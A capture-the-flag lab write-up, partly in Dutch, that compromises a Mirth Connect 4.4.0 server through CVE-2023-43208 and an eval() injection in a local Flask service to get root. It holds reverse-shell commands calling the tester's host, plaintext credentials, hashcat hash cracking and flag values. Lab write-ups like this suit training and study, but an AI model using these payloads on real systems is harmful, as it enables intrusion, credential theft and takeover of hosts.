# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
└──╼ [★]$ nmap 10.129.3.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:42 CST
Nmap scan report for 10.129.3.19
Host is up (0.0083s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
└──╼ [★]$ nmap -p22,80,443 -sCV 10.129.3.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-23 01:43 CST
Nmap scan report for 10.129.3.19
Host is up (0.0076s latency).

PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http
|_http-title: Mirth Connect Administrator
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-566528e5</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 23 Feb 2026 07:43:13 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 23 Feb 2026 07:43:13 GMT
|     Allow: GET, HEAD, TRACE, OPTIONS
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   X11Probe: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/https
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-566528e5</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 23 Feb 2026 07:43:19 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 23 Feb 2026 07:43:20 GMT
|_    Allow: GET, HEAD, TRACE, OPTIONS
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=2/23%Time=699C0512%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20Feb\x20
SF:2026\x2007:43:13\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x202023\
SF:x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html>\n<hea
SF:d>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20c
SF:harset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\
SF:"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-ca
SF:che\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-store\"
SF:>\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\t<link\
SF:x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"images/N
SF:G_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20type=\"t
SF:ext/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\"styles
SF:heet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\n\t<scr
SF:ipt\x20type=\"text/javascript\">\n\t\t/\*\x20Break\x20out\x20of\x20fram
SF:e\x20if\x20inside\x20a\x20frame\.\x20\*/\n\t\tif\x20\(window\x20!=\x20w
SF:indow\.top\)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.location
SF:;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x20sr")%
SF:r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20Feb\
SF:x202026\x2007:43:13\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\x20OPTI
SF:ONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\
SF:r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20
SF:58\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>re
SF:ason:\x20Unknown\x20Version</pre>")%r(X11Probe,C3,"HTTP/1\.1\x20400\x20
SF:Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>
SF:Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=
SF:0x0</pre>")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\r\n<html>
SF:\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;c
SF:harset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</title>\n</h
SF:ead>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<table>\n<tr
SF:><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></tr>\n<tr>
SF:<th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>Not\x20Foun
SF:d</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.servlet\.Ser
SF:vletHandler\$Default404Servlet-566528e5</td></tr>\n</table>\n\n</body>\
SF:n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=2/23%Time=699C0518%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\x20
SF:Feb\x202026\x2007:43:19\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x
SF:202023\x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
SF:s:\x20bytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html
SF:>\n<head>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/htm
SF:l;\x20charset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20co
SF:ntent=\"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=
SF:\"no-cache\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-
SF:store\">\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\
SF:t<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"i
SF:mages/NG_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20t
SF:ype=\"text/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\
SF:"stylesheet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\
SF:n\t<script\x20type=\"text/javascript\">\n\t\t/\*\x20Break\x20out\x20of\
SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20\*/\n\t\tif\x20\(window\x20
SF:!=\x20window\.top\)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.l
SF:ocation;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x
SF:20sr")%r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2023\
SF:x20Feb\x202026\x2007:43:20\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\
SF:x20OPTIONS\r\n\r\n")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x
SF:20Found\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nConte
SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\
SF:r\n<html>\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;charset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</ti
SF:tle>\n</head>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<ta
SF:ble>\n<tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></
SF:tr>\n<tr><th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>No
SF:t\x20Found</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.ser
SF:vlet\.ServletHandler\$Default404Servlet-566528e5</td></tr>\n</table>\n\
SF:n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben naar de url geweest en daar kom je op de volgende pagina terecht.

![[Pasted image 20260223084747.png]]

Zoals je daar kan zien kan je de admin launcher downloaden. Maar zoals je zelf zult kunnen zien is er niet veel dat je daar kunt vinden. Als je op de launch mirth Connect Administrator gaat klikken, krijg je het volgende document te zien.

![[Pasted image 20260223095923.png]]

Daar kan je zien dat mirth admin launcher op versie 4.4.0 draait. Ik ben hiervoor een exploit gaan zoeken en hiervoor heb ik de volgende exploit gevonden. https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT

Ik ben de exploit gaan uitvoeren en daar kan je zien dat we een connectie met de server krijgen.

```
┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~/CVE-2023-43208-EXPLOIT]
└──╼ [★]$ python3 CVE-2023-43208.py -u https://interpreter.htb -lh 10.10.15.188 -lp 4444
//
[*] Looking for Mirth Connect instance...
[+] Found Mirth Connect instance
[+] Vulnerable Mirth Connect version 4.4.0 instance found at https://interpreter.htb
[!] sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/10.10.15.188/4444;sh <&53 >&53 
2>&53'
[*] Launching exploit against https://interpreter.htb...

┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.188] from (UNKNOWN) [10.129.3.19] 43296
```

Ik ben binnen de connectie gaan zoeken en heb ik een username en een password in het volgende document gevonden.

```
mirth@interpreter:/usr/local/mirthconnect/conf$ cat mirth.properties
# database credentials
database.username = mirthdb
database.password = MirthPass123!

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS
mys

database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod
```



```
MariaDB [mc_bdd_prod]> SELECT * FROM PERSON;
SELECT * FROM PERSON;

|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |          

MariaDB [mc_bdd_prod]> SELECT * FROM PERSON_PASSWORD
SELECT * FROM PERSON_PASSWORD

| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |

```

Hier kan je dus zien dat er een sha256:600000 hash gevonden is. Ik zal dus aan de hand van het volgende commando de hash gaan proberen cracken. Hieraan kan je zien dat het password van sedric gevonden is.

```
┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~/CVE-2023-43208-EXPLOIT]
└──╼ [★]$ cat hash.txt 
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=

┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~/CVE-2023-43└──╼ [★]$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt                 importhashcat (v6.2.6) starting

//

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
```

Ik zal nu gaan inloggen opm de ssh server.

```
┌─[eu-dedivip-2]─[10.10.15.188]─[hackthekat123@htb-3mynmjs0ef]─[~]
└──╼ [★]$ ssh sedric@interpreter.htb
The authenticity of host 'interpreter.htb (10.129.3.19)' can't be established.
ED25519 key fingerprint is SHA256:Oz7Fk6YvrB8/5uSyuoY+mqLefkwpPaepkXAppxIX0xk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'interpreter.htb' (ED25519) to the list of known hosts.
sedric@interpreter.htb's password: 
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Feb 23 05:08:44 2026 from 10.10.15.188
sedric@interpreter:~$
```

Nu kan je het user.txt bestand vinden

```
sedric@interpreter:~$ cat user.txt 
1216ebd8f2675ea4fa942e7f5a658f97
```

Python eval() Injection

dit door gebruik te maken het volgende script

```
cat notif.py
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)
```

```
sedric@interpreter:~$ python3 -c "
import urllib.request, base64
cmd = 'nc 10.10.15.188 5555 -e /bin/bash'
b64_cmd = base64.b64encode(cmd.encode()).decode()
xml = f'<patient><timestamp>20250101120000</timestamp><sender_app>TEST</sender_app><id>12345</id><firstname>{{__import__(\"os\").system(__import__(\"base64\").b64decode(\"{b64_cmd}\").decode())}}</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                             data=xml.encode(),
                             headers={'Content-Type': 'application/xml'})
urllib.request.urlopen(req)
"
```

```
$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.15.188] from (UNKNOWN) [10.129.3.19] 58248
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
f014baa9e84ded9863150f607ce8b099
```

![[Pasted image 20260223111727.png]]